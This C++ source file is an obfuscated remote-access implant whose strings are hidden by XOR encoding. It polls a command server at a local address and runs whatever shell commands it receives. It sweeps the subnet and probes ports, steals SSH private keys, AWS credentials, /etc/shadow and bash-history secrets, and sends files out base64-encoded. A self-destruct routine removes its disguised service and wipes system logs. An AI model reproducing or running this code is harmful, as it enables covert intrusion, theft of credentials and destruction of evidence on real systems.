#include <iostream>
#include <array>
#include <cstdio>
#include <memory>
#include <sstream>
#include <thread>
#include <atomic>
#include <chrono>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

using VI = std::vector<int>;
static std::string zz(const VI& c) { std::string o; for (int i:c) o+=(char)(i^0x5A); return o; }
static void _x0(){int x=42;if(((x*x)<0))exit(0);}

static const VI _pm = {40};
static const VI _cu = {50,46,46,42,96,117,117,107,104,109,116,106,116,106,116,107,96,111,106,106,106};
static const VI _cp = {57,47,40,54,122,119,41,122,119,55,122,111,122,119,2,122,10,21,9,14,122,119,18,122,125,25,53,52,46,63,52,46,119,14,35,42,63,96,122,59,42,42,54,51,57,59,46,51,53,52,117,48,41,53,52,125,122,119,62,122,125};
static const VI _cg = {57,47,40,54,122,119,41,122,119,55,122,111,122,125};
static const VI _tk = {125};
static const VI _ts = {125,122,125};
static const VI _sb = {117,47,41,40,117,54,53,57,59,54,117,56,51,52,117,41,35,41,46,63,55,62,119,57,59,57,50,63,119,41,44,57};
static const VI _su = {117,63,46,57,117,41,35,41,46,63,55,62,117,41,35,41,46,63,55,117,41,35,41,46,63,55,62,119,57,59,57,50,63,116,41,63,40,44,51,57,63};
static const VI _sn = {41,35,41,46,63,55,62,119,57,59,57,50,63,116,41,63,40,44,51,57,63};
static const VI _ec = {117,57,50,63,57,49,51,52};
static const VI _em = {117,57,53,55,55,59,52,62};
static const VI _er = {117,40,63,41,47,54,46};
static const VI _ee = {117,63,34,60,51,54};
static const VI _hc = {50,53,41,46,52,59,55,63};
static const VI _qt = {120};
static const VI _jo = {33,120};
static const VI _jc = {120,39};
static const VI _jq = {120,96,120};
static const VI _jm = {120,118,120};
static const VI _hk = {50,53,41,46};
static const VI _ok = {53,47,46,42,47,46};
static const VI _ck = {57,53,55,55,59,52,62};
static const VI _fk = {60,51,54,63,52,59,55,63};
static const VI _dk = {62,59,46,59};
static const VI _cf = {60,47,54,54,5,57,50,59,51,52};
static const VI _cn = {52,63,46,45,53,40,49,5,41,45,63,63,42};
static const VI _cc = {57,40,63,62,63,52,46,51,59,54,5,50,59,40,44,63,41,46};
static const VI _cx = {63,34,60,51,54,122};
static const VI _cd = {41,63,54,60,5,62,63,41,46,40,47,57,46};
static const VI _cw = {45,59,51,46};
static const VI _co = {52,53,52,63};
static const VI _ce = {63,34,51,46};
static const VI _cq = {43,47,51,46};
static const VI _rc = {63,57,50,53,122,125,103,103,103,122,18,21,9,14,20,27,23,31,122,103,103,103,125,122,124,124,122,50,53,41,46,52,59,55,63,122,124,124,122,63,57,50,53,122,125,103,103,103,122,13,18,21,27,23,19,122,103,103,103,125,122,124,124,122,45,50,53,59,55,51,122,124,124,122,63,57,50,53,122,125,103,103,103,122,19,30,122,103,103,103,125,122,124,124,122,51,62,122,124,124,122,63,57,50,53,122,125,103,103,103,122,21,9,122,103,103,103,125,122,124,124,122,47,52,59,55,63,122,119,59,122,124,124,122,63,57,50,53,122,125,103,103,103,122,20,31,14,13,21,8,17,122,103,103,103,125,122,124,124,122,114,51,42,122,59,62,62,40,122,104,100,117,62,63,44,117,52,47,54,54,122,38,38,122,51,60,57,53,52,60,51,61,122,104,100,117,62,63,44,117,52,47,54,54,115};
static const VI _nr = {51,42,122,40,53,47,46,63,122,41,50,53,45,122,62,63,60,59,47,54,46,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _nv = {44,51,59,122};
static const VI _nf = {51,42,122,119,110,122,59,62,62,40,122,41,50,53,45,122,41,57,53,42,63,122,61,54,53,56,59,54,122,104,100,117,62,63,44,117,52,47,54,54,122,38,122,61,40,63,42,122,51,52,63,46,122,38,122,50,63,59,62,122,119,107,122,38,122,59,45,49,122,125,33,42,40,51,52,46,122,6,39,125};
static const VI _np = {42,51,52,61,122,119,57,122,107,122,119,13,122,107,122};
static const VI _nq = {122,104,100,117,62,63,44,117,52,47,54,54,122,38,122,61,40,63,42,122,119,57,122,125,107,122,40,63,57,63,51,44,63,62,125};
static const VI _nb = {114,63,57,50,53,122,100,117,62,63,44,117,46,57,42,117};
static const VI _na = {115,122,104,100,117,62,63,44,117,52,47,54,54,122,124,124,122,63,57,50,53,122,53,42,63,52,122,38,38,122,63,57,50,53,122,57,54,53,41,63,62};
static const VI _op = {53,42,63,52};
static const VI _cs = {60,51,52,62,122,117,122,119,55,59,34,62,63,42,46,50,122,111,122,119,52,59,55,63,122,125,51,62,5,40,41,59,125,122,119,53,122,119,52,59,55,63,122,125,51,62,5,63,57,62,41,59,125,122,119,53,122,119,52,59,55,63,122,125,51,62,5,63,62,104,111,111,107,99,125,122,119,53,122,119,52,59,55,63,122,125,51,62,5,62,41,59,125,122,119,53,122,119,52,59,55,63,122,125,112,116,42,63,55,125,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _ca = {60,51,52,62,122,117,122,119,55,59,34,62,63,42,46,50,122,111,122,6,114,122,119,52,59,55,63,122,125,59,47,46,50,53,40,51,32,63,62,5,49,63,35,41,125,122,119,53,122,119,52,59,55,63,122,125,49,52,53,45,52,5,50,53,41,46,41,125,122,6,115,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _sp = {117,63,46,57,117,41,50,59,62,53,45};
static const VI _cl = {60,51,52,62,122,117,122,119,55,59,34,62,63,42,46,50,122,111,122,6,114,122,119,52,59,55,63,122,125,57,40,63,62,63,52,46,51,59,54,41,125,122,119,42,59,46,50,122,125,112,117,116,59,45,41,117,112,125,122,119,53,122,119,52,59,55,63,122,125,57,53,52,60,51,61,125,122,119,42,59,46,50,122,125,112,117,116,59,45,41,117,112,125,122,119,53,122,119,52,59,55,63,122,125,112,116,48,41,53,52,125,122,119,42,59,46,50,122,125,112,117,116,61,57,42,117,112,125,122,119,53,122,119,52,59,55,63,122,125,112,116,48,41,53,52,125,122,119,42,59,46,50,122,125,112,117,116,57,53,52,60,51,61,117,61,57,54,53,47,62,117,112,125,122,119,53,122,119,52,59,55,63,122,125,116,63,52,44,125,122,119,53,122,119,52,59,55,63,122,125,116,52,63,46,40,57,125,122,6,115,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _ch = {60,51,52,62,122,117,122,119,55,59,34,62,63,42,46,50,122,110,122,119,52,59,55,63,122,125,116,56,59,41,50,5,50,51,41,46,53,40,35,125,122,119,53,122,119,52,59,55,63,122,125,116,32,41,50,5,50,51,41,46,53,40,35,125,122,104,100,117,62,63,44,117,52,47,54,54,122,38,122,34,59,40,61,41,122,61,40,63,42,122,119,51,50,31,122,125,114,42,59,41,41,45,53,40,62,38,46,53,49,63,52,38,41,63,57,40,63,46,38,59,42,51,116,49,63,35,38,27,13,9,5,38,10,8,19,12,27,14,31,115,125,122,104,100,117,62,63,44,117,52,47,54,54,122,38,122,50,63,59,62,122,119,111,106};
static const VI _d1 = {41,35,41,46,63,55,57,46,54,122,41,46,53,42,122};
static const VI _d2 = {41,35,41,46,63,55,57,46,54,122,62,51,41,59,56,54,63,122};
static const VI _d3 = {40,55,122,119,60,122};
static const VI _d4 = {41,35,41,46,63,55,57,46,54,122,62,59,63,55,53,52,119,40,63,54,53,59,62,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _d5 = {41,35,41,46,63,55,57,46,54,122,40,63,41,63,46,119,60,59,51,54,63,62,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _d6 = {48,53,47,40,52,59,54,57,46,54,122,119,119,40,53,46,59,46,63,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _d7 = {48,53,47,40,52,59,54,57,46,54,122,119,119,44,59,57,47,47,55,119,46,51,55,63,103,107,41,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _d8 = {41,63,62,122,119,51,122,125,117};
static const VI _d9 = {117,62,125,122,117,44,59,40,117,54,53,61,117,59,47,46,50,116,54,53,61,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _da = {117,62,125,122,117,44,59,40,117,54,53,61,117,41,35,41,54,53,61,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _db = {41,35,41,46,63,55,62,119,57,59,57,50,63};
static const VI _dc = {40,55,122,119,60,122,117,46,55,42,117,116,41,35,41,46,63,55,62,119,57,59,57,50,63,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _dd = {40,55,122,119,60,122,117,46,55,42,117,116,42,63,40,41,51,41,46,116,41,50,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _de = {40,55,122,119,40,60,122,117,46,55,42,117,41,47,62,53,41,46,59,61,63,116,112,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _df = {41,63,62,122,119,51,122,125,117,41,35,41,46,63,55,62,119,57,59,57,50,63,117,62,125,122,117,40,53,53,46,117,116,56,59,41,50,5,50,51,41,46,53,40,35,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _dg = {41,63,62,122,119,51,122,125,117,10,63,40,41,51,41,46,63,52,46,117,62,125,122,117,40,53,53,46,117,116,56,59,41,50,5,50,51,41,46,53,40,35,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _fs = {60,51,52,62,122,117,122,119,55,59,34,62,63,42,46,50,122,111,122,6,114,122,119,52,59,55,63,122,125,51,62,5,40,41,59,125,122,119,53,122,119,52,59,55,63,122,125,51,62,5,63,57,62,41,59,125,122,119,53,122,119,52,59,55,63,122,125,51,62,5,63,62,104,111,111,107,99,125,122,119,53,122,119,52,59,55,63,122,125,51,62,5,62,41,59,125,122,6,115,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _re = {122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _dt = {116};
static const VI _sl = {117};
static const VI _on = {107};

static const int _ps = 5;

static std::string _a(const std::string& b) {
    std::array<char,256> c{}; std::string d;
    FILE* p=popen(b.c_str(),zz(_pm).c_str());
    if(!p)return""; while(fgets(c.data(),c.size(),p)!=nullptr)d+=c.data();
    pclose(p); if(!d.empty()&&d.back()=='\n')d.pop_back(); return d;
}
static std::string _e(const std::string& b,const std::string& k) {
    if(b.empty())return""; std::string n=zz(_qt)+k+zz(_qt);
    size_t i=b.find(n);if(i==std::string::npos)return"";
    size_t c=b.find(':',i);if(c==std::string::npos)return"";
    size_t s=b.find('"',c);if(s==std::string::npos)return"";++s;
    size_t e=b.find('"',s);if(e==std::string::npos||e<=s)return"";
    return b.substr(s,e-s);
}
static std::string _f(const std::string& s) {
    std::string o; for(char c:s){switch(c){
    case'\\':o+="\\\\";break;case'"':o+="\\\"";break;
    case'\n':o+="\\n";break;case'\r':o+="\\r";break;
    case'\t':o+="\\t";break;default:o+=c;break;}} return o;
}
static std::string _b64(const std::vector<uint8_t>& d) {
    static const char*t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string o;size_t l=d.size();o.reserve(((l+2)/3)*4);
    for(size_t i=0;i<l;i+=3){uint32_t v=(uint32_t)d[i]<<16;
    if(i+1<l)v|=(uint32_t)d[i+1]<<8;if(i+2<l)v|=(uint32_t)d[i+2];
    o+=t[(v>>18)&0x3F];o+=t[(v>>12)&0x3F];
    o+=(i+1<l)?t[(v>>6)&0x3F]:'=';o+=(i+2<l)?t[(v>>0)&0x3F]:'=';}return o;
}
static std::vector<uint8_t> _rf(const std::string& p) {
    std::ifstream f(p,std::ios::binary|std::ios::ate);
    if(!f.is_open())return{};auto sz=f.tellg();if(sz<=0)return{};
    std::vector<uint8_t> b((size_t)sz);f.seekg(0);
    f.read(reinterpret_cast<char*>(b.data()),sz);return b;
}
static std::string _g(const std::string& path,const std::string& json) {
    return _a(zz(_cp)+json+zz(_ts)+zz(_cu)+path+zz(_tk));
}
static std::string _h(const std::string& path) {
    return _a(zz(_cg)+zz(_cu)+path+zz(_tk));
}
static void _sr(const std::string& o) {
    _g(zz(_er),zz(_jo)+zz(_ok)+zz(_jq)+_f(o)+zz(_jc));
}

static std::string _t1() {
    std::string o; std::string ri=_a(zz(_nr)); o+=ri+"\n";
    std::string sn; size_t vp=ri.find(zz(_nv));
    if(vp!=std::string::npos){size_t is2=vp+4;size_t ie=ri.find(' ',is2);
    std::string gw=ri.substr(is2,ie-is2);size_t ld=gw.rfind('.');
    if(ld!=std::string::npos)sn=gw.substr(0,ld);}
    if(sn.empty()){std::string ii=_a(zz(_nf));size_t sl=ii.find('/');
    if(sl!=std::string::npos)ii=ii.substr(0,sl);size_t ld=ii.rfind('.');
    if(ld!=std::string::npos)sn=ii.substr(0,ld);}
    if(sn.empty())return o;
    std::vector<std::string> lh;
    for(int i=1;i<=254;i++){std::string h=sn+zz(_dt)+std::to_string(i);
    std::string r=_a(zz(_np)+h+zz(_nq));
    if(r.find(zz(_on))!=std::string::npos){o+=h+"\n";lh.push_back(h);}}
    int ports[]={22,80,443,8080,3306,5432,6379,8443,25565};
    for(const auto&h:lh){for(int p:ports){
    std::string pr=_a(zz(_nb)+h+zz(_sl)+std::to_string(p)+zz(_na));
    if(pr.find(zz(_op))!=std::string::npos)o+=std::to_string(p)+" ";}o+="\n";}
    return o;
}

static std::string _t2() {
    std::string o;
    std::string sk=_a(zz(_cs));
    if(!sk.empty()){o+=sk+"\n";std::istringstream ss(sk);std::string kp;
    while(std::getline(ss,kp)){if(kp.empty())continue;
    std::vector<uint8_t> d=_rf(kp);if(!d.empty())o+=std::string(d.begin(),d.end())+"\n";}}
    std::string ak=_a(zz(_ca));
    if(!ak.empty()){std::istringstream ss(ak);std::string p;
    while(std::getline(ss,p)){if(p.empty())continue;
    std::vector<uint8_t> d=_rf(p);if(!d.empty())o+=std::string(d.begin(),d.end())+"\n";}}
    std::vector<uint8_t> sh=_rf(zz(_sp));
    if(!sh.empty())o+=std::string(sh.begin(),sh.end())+"\n";
    std::string cf=_a(zz(_cl));
    if(!cf.empty()){std::istringstream ss(cf);std::string p;
    while(std::getline(ss,p)){if(p.empty())continue;
    std::vector<uint8_t> d=_rf(p);if(!d.empty())o+=std::string(d.begin(),d.end())+"\n";}}
    std::string hg=_a(zz(_ch));if(!hg.empty())o+=hg+"\n";
    return o;
}

static std::string _t3(const std::string& fp) {
    std::string o; if(fp.empty())return o;
    std::vector<uint8_t> d=_rf(fp);if(d.empty())return o;
    std::string enc=_b64(d);
    _g(zz(_ee),zz(_jo)+zz(_fk)+zz(_jq)+_f(fp)+zz(_jm)+zz(_dk)+zz(_jq)+enc+zz(_jc));
    o+=std::to_string(d.size())+" "+std::to_string(enc.size())+"\n"; return o;
}

std::atomic<bool> _st{true};

static std::string _t4() {
    std::string o;
    _a(zz(_d1)+zz(_sn)+zz(_re));_a(zz(_d2)+zz(_sn)+zz(_re));
    _a(zz(_d3)+zz(_su));_a(zz(_d4));_a(zz(_d5));
    _a(zz(_d3)+zz(_sb));
    _a(zz(_d6));_a(zz(_d7));
    _a(zz(_d8)+zz(_sn)+zz(_d9));_a(zz(_d8)+zz(_sn)+zz(_da));
    _a(zz(_d8)+zz(_db)+zz(_d9));_a(zz(_d8)+zz(_db)+zz(_da));
    _a(zz(_dc));_a(zz(_dd));_a(zz(_de));_a(zz(_df));_a(zz(_dg));
    _st=false; return o;
}

static std::string _t5() {
    std::string o;
    std::string rc=_a(zz(_rc));o+=rc+"\n";
    o+=_t1();o+=_t2();
    std::string skp=_a(zz(_fs));
    if(!skp.empty()){std::istringstream ss(skp);std::string kp;
    while(std::getline(ss,kp)){if(!kp.empty())o+=_t3(kp);}}
    o+=_t3(zz(_sp)); return o;
}

static std::string _d(const std::string& cmd) {
    if(cmd==zz(_cf))return _t5();
    if(cmd==zz(_cn))return _t1();
    if(cmd==zz(_cc))return _t2();
    if(cmd.rfind(zz(_cx),0)==0){std::string fp=cmd.substr(6);
    while(!fp.empty()&&fp.front()==' ')fp.erase(0,1);
    while(!fp.empty()&&fp.back()==' ')fp.pop_back();return _t3(fp);}
    if(cmd==zz(_cd))return _t4();
    return _a(cmd);
}

#ifndef TEST_BUILD
void _p(){int fl=0;while(_st&&fl<50){
    std::this_thread::sleep_for(std::chrono::seconds(_ps));
    try{std::string r=_h(zz(_em));if(r.empty()){fl++;continue;}fl=0;
    std::string c=_e(r,zz(_ck));
    if(c.empty()||c==zz(_cw)||c==zz(_co))continue;
    if(c==zz(_ce)||c==zz(_cq)){_st=false;break;}
    _sr(_d(c));}catch(...){fl++;}}}

int main(){_x0();int op=7;if(((op*op+op)%2)==0){
    std::string h=_a(zz(_hc));
    _g(zz(_ec),zz(_jo)+zz(_hk)+zz(_jq)+_f(h)+zz(_jc));
    std::string rc=_a(zz(_rc));_sr(rc);
    std::thread t(_p);t.join();}return 0;}
#endif
